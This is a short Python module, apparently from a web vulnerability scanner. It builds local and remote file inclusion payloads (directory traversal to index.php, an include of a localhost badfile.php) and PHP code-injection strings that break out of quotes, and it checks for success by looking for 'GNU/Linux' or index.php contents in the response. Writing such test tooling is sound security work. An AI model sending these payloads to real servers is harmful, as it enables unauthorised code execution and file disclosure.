import requests

def lfi(depth = 3, filename="index"):
	payloadList = list()
	#finds index.php at base
	## depthPayload += "..%2F"
	payload = ""
	
	#LFI
	payloadList.append(payload + filename)
	payloadList.append(payload + filename + ".php")

	depthPayload = payload	
	for i in range(0,depth):
		depthPayload += "../"
		depthPayloadNoPHP = depthPayload + filename
		depthPayloadPHP = depthPayloadNoPHP + ".php"
		payloadList.append(depthPayloadNoPHP)
		payloadList.append(depthPayloadPHP)	
	return payloadList

def rfi():
	rfiList = list()
	rfiList.append("http://localhost/badfile.php?")
	return rfiList

def get_all(depth = 5, filename="index"):
	lfi_list = lfi(depth,filename);
	inclusion_list = lfi_list + rfi();
	all_list = list()
	#add in items for eval
	for i in inclusion_list:
		simple = "1; include('"+i+"')"
		singleEcho = "';include('"+i+"');echo'"
		doubleEcho = '";include("'+i+'");echo"' 
		all_list.append(simple)
		all_list.append(singleEcho)
		all_list.append(doubleEcho)
	
	all_list.extend(inclusion_list)
	#write a html-escaped version of each as well?

	all_list = [(item, "Server Side Code Injection") for item in all_list]
	return all_list

def checkSuccess(BASE_URL, content):
	if len(content.history)!=0:
		return False;
	html = content.text
	indexPHP = requests.get(BASE_URL + "/index.php") 
	if indexPHP.text in html: 	
		return True 
	#uname -a successful: 
	if "GNU/Linux" in html: 
		return True 

	return False;

if __name__ == "__main__":	
	url = "/serverside/lfi2.php"
	print(get_all())
